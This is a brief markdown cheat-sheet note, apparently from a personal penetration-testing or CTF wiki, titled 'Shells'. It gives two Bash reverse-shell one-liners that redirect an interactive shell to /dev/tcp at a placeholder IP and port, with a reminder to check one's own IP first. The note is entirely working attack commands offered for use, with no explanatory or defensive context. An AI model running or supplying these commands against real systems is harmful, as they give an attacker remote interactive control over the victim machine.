# Shells

Always remember to check your IP: [[Linux Networking#Get your IP]]

## Bash Reverse

```bash
bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
```

or

```bash
bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
```